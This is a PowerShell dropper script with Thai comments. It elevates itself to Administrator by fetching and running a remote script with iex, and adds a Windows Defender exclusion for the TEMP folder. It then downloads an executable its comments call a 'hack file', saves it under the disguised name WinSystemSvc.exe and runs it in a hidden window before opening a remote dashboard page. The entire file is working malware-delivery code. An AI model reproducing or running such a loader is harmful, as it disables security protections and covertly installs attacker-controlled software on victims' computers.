# 1. ขอสิทธิ์ Administrator (Self-Elevation)
# *** สำคัญ: เปลี่ยน URL ด้านล่างเป็นลิงก์ RAW ของไฟล์ install.ps1 ตัวนี้บน GitHub ของคุณ ***
$scriptUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/install.ps1"

if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"iex (irm '$scriptUrl')`"" -Verb RunAs
    exit
}

# 2. ตั้งค่าความปลอดภัย (ข้ามการสแกนไวรัสในโฟลเดอร์ Temp)
Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue

# 3. ข้อมูลไฟล์แฮกของคุณ
$exeUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/hack1.exe"
$savePath = "$env:TEMP\WinSystemSvc.exe" # ชื่อไฟล์ที่จะไปแฝงตัวในเครื่อง (ตั้งให้เนียน)

# 4. ดาวน์โหลดและเริ่มทำงานแบบซ่อนหน้าต่าง (Silent)
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $exeUrl -OutFile $savePath -UseBasicParsing
    
    # รันโปรแกรมในพื้นหลังแบบ Hidden
    Start-Process $savePath -WindowStyle Hidden
    
    # 5. เปิดหน้าเว็บ Dashboard เพื่อให้คุณเริ่มปรับค่า
    # (เปลี่ยนเป็นลิงก์หน้าเว็บ Dashboard ของคุณ)
    Start-Process "https://creative-bombolone-1e0912.netlify.app/"
}
catch {
    # กรณีผิดพลาด
}
